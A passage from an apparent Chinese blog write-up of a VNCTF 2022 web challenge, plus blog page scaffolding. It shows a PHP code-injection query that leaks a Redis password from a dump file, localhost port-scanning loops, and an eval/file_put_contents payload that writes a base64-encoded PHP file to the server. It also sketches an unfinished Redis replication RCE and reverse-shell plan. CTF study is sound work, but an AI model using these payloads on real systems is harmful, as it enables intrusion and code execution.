+<pre class=" language-1"><code class="language-1">/?exp=var_dump(highlight_file(end(scandir('.'))));
+得到： REDIS0008�    redis-ver4.0.9�
+redis-bits�@�ctime³��a�used-mem��aof-preamble���sercetye_w4nt_a_gir1fri3nd��nR�K��S bool(true) 
+</code></pre>
+<p>可以将文件下载下来，用<a target="_blank" rel="noopener" href="https://github.com/sripathikrishnan/redis-rdb-tools/">redis-rdb-tools</a>去解析。<br>可以猜测redis的auth为 ye_w4nt_a_gir1fri3nd，然后就是端⼝扫描寻找redis端⼝的操作，有脚本（官方WP）</p>
+<pre class=" language-php"><code class="language-php"><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token number">10000</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+  <span class="token variable">$t</span><span class="token operator">=</span><span class="token function">stream_socket_server</span><span class="token punctuation">(</span>"tcp<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//0.0.0.0:".$i,$ee,$ee2);</span>
+  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$ee2</span> <span class="token operator">===</span> <span class="token string">"Address already in use"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>桥桥博客还有一个脚本</p>
+<pre class=" language-php"><code class="language-php"><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token number">10000</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+  <span class="token variable">$t</span><span class="token operator">=</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span>'http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//127.0.0.1:'.$i);</span>
+  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token function">error_get_last</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'message'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"Connection refused"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>最后，构造payload</p>
+<pre class=" language-1"><code class="language-1">/?exp=eval(file_put_contents("1.php",base64_decode($_POST['a'])));
+POST:
+a=PD9waHAKaGlnaGxpZ2h0X2ZpbGUoX19GSUxFX18pOwojIFBvcnQgc2Nhbgpmb3IoJGk9MDskaTw2NTUzNTskaSsrKSB7CiAgJHQ9c3RyZWFtX3NvY2tldF9zZXJ2ZXIoInRjcDovLzAuMC4wLjA6Ii4kaSwkZWUsJGVlMik7CiAgaWYoJGVlMiA9PT0gIkFkZHJlc3MgYWxyZWFkeSBpbiB1c2UiKSB7CiAgICB2YXJfZHVtcCgkaSk7CiAgfQp9Cg==
+</code></pre>
+<p>访问/1.php，发现80和8888端口可用<br>其实按照常规思路是可以利⽤蚁剑等⼯具直接连接redis来实现主从复制RCE的，但是分析⼀下蚁剑的流量可以发现蚁剑是利⽤ stream_get_contents() 来实现redis连接交互的，这⾥ban了这个函数，所以需要寻找其他的⽅法来和redis交互。利⽤ get_loaded_extensions() 可以看到PHP加载的插件，从中可以看到题⽬环境中加载了PHP的redis插件（redis.so），翻找⼀下⽂档可以找到这个插件的Redis类中有 rawCommand() ⽅法可以执⾏redis的命令操作。<br>要素⻬全，可以实现redis主从复制RCE，先利⽤ file_put_contents() 来写⼊⼀个redis主从复制RCE的so⽂件，<br>接下来就是构造⼀个反弹Shell的Payload：</p>
+<p>先咕咕了，等学一学redis再来填坑</p>
+
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        Author:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">kingkb</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        Link:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="http://kingofkb.github.io/2022/02/18/VNCTF-web%E5%A4%8D%E7%8E%B0/">http://kingofkb.github.io/2022/02/18/VNCTF-web%E5%A4%8D%E7%8E%B0/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        Reprint policy:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    All articles in this blog are used except for special statements
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    reprint policy. If reproduced, please indicate source
+                    <a href="/about" target="_blank">kingkb</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>Copied successfully, please follow the reprint policy of this article</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">more</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/VNCTF2022/">
+                                    <span class="chip bg-color">VNCTF2022</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+                <style>
+    #reward {
+        margin: 40px 0;
+        text-align: center;
+    }
+
+    #reward .reward-link {
+        font-size: 1.4rem;
+        line-height: 38px;
+    }
+
+    #reward .btn-floating:hover {
+        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    #rewardModal {
+        width: 320px;
+        height: 350px;
+    }
+
+    #rewardModal .reward-title {
+        margin: 15px auto;
+        padding-bottom: 5px;
+    }
+
+    #rewardModal .modal-content {
+        padding: 10px;
+    }
+
+    #rewardModal .close {
+        position: absolute;
+        right: 15px;
+        top: 15px;
+        color: rgba(0, 0, 0, 0.5);
+        font-size: 1.3rem;
+        line-height: 20px;
+        cursor: pointer;
+    }
+
+    #rewardModal .close:hover {
+        color: #ef5350;
+        transform: scale(1.3);
+        -moz-transform:scale(1.3);
+        -webkit-transform:scale(1.3);
+        -o-transform:scale(1.3);
+    }
+
+    #rewardModal .reward-tabs {
+        margin: 0 auto;
+        width: 210px;
+    }
+
+    .reward-tabs .tabs {
+        height: 38px;
+        margin: 10px auto;
+        padding-left: 0;
+    }
+
+    .reward-content ul {
+        padding-left: 0 !important;
+    }
+
+    .reward-tabs .tabs .tab {
+        height: 38px;
+        line-height: 38px;
+    }
+
+    .reward-tabs .tab a {
+        color: #fff;
+        background-color: #ccc;
+    }
+
+    .reward-tabs .tab a:hover {
+        background-color: #ccc;
+        color: #fff;
+    }
+
+    .reward-tabs .wechat-tab .active {
+        color: #fff !important;
+        background-color: #22AB38 !important;
+    }
+
+    .reward-tabs .alipay-tab .active {
+        color: #fff !important;
+        background-color: #019FE8 !important;
+    }
+
+    .reward-tabs .reward-img {
+        width: 210px;
+        height: 210px;
+    }
+</style>
+
+<div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fas fa-times"></i></a>
+            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="alipay">
+                        <img src="/medias/reward/alipay1.jpg" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                    <div id="wechat">
+                        <img src="/medias/reward/wechat1.png" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;Previous</div>
+            <div class="card">
+                <a href="/2022/02/23/GXYCTF2019%20%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83%201%E9%A2%98%E8%A7%A3/">
+                    <div class="card-image">
+                        
+                        <img src="https://kingofkb.github.io/medias/cover/hs.jpg" class="responsive-img" alt="GXYCTF2019 禁止套娃 1题解">
+                        
+                        <span class="card-title">GXYCTF2019 禁止套娃 1题解</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            RCE+.git
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2022-02-23
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/ctf/" class="post-category">
+                                    ctf
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/git%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2-%E6%97%A0%E5%8F%82%E6%95%B0RCE/">
+                        <span class="chip bg-color">.git源码泄露 无参数RCE</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                Next&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2022/02/11/BUUCTF%202018%20Online%20Too%201%E9%A2%98%E8%A7%A3/">
+                    <div class="card-image">
+                        
+                        <img src="https://kingofkb.github.io/medias/cover/al.jpg" class="responsive-img" alt="BUUCTF 2018 Online Too 1题解">
+                        
+                        <span class="card-title">BUUCTF 2018 Online Too 1题解</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            escapeshellarg和escapeshellcmd合用的漏洞
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-02-11
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            kingkb
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-nmap/">
+                        <span class="chip bg-color">代码审计 nmap</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+
+    <div class="container row center-align"
+         style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2022-2023</span>
+            
+            <a href="/about" target="_blank">kingkb</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+                &nbsp;<i class="fas fa-chart-area"></i>&nbsp;Total Words:&nbsp;<span
+                        class="white-color">64.2k</span>
+            
+            
+            
+                
+            
+            
+                <span id="busuanzi_container_site_pv">
+                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;Total visits:&nbsp;
+                    <span id="busuanzi_value_site_pv" class="white-color"></span>
+            </span>
+            
+            
+                <span id="busuanzi_container_site_uv">
+                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;Total visitors:&nbsp;
+                    <span id="busuanzi_value_site_uv" class="white-color"></span>
+            </span>
+            
+            <br>
+
+            <!-- 运行天数提醒. -->
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/kingofkb" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:1527411491@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1527411491" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1527411491" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+
+
+    <a href="https://space.bilibili.com/283283733?spm_id_from=333.1007.0.0" class="tooltipped" target="_blank" data-tooltip="关注我的B站" data-position="top" data-delay="50">
+        <i class="fa-brands fa-bilibili"></i>
+    </a>
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;Search</span>
+            <input type="search" id="searchInput" name="s" placeholder="Please enter a search keyword"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    
+
+    
+        
+        <script type="text/javascript">
+            // 只在桌面版网页启用特效
+            var windowWidth = $(window).width();
+            if (windowWidth > 768) {
+                document.write('<script type="text/javascript" src="/libs/others/sakura.js"><\/script>');
+            }
+        </script>
+    
+
+    <!-- 雪花特效 -->
+    
+
+    <!-- 鼠标星星特效 -->
+    
+
+     
+        <script src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
+        <script src="/libs/others/TencentCaptcha.js"></script>
+        <button id="TencentCaptcha" data-appid="xxxxxxxxxx" data-cbfn="callback" type="button" hidden></button>
+    
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    <!--腾讯兔小巢-->
+    
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
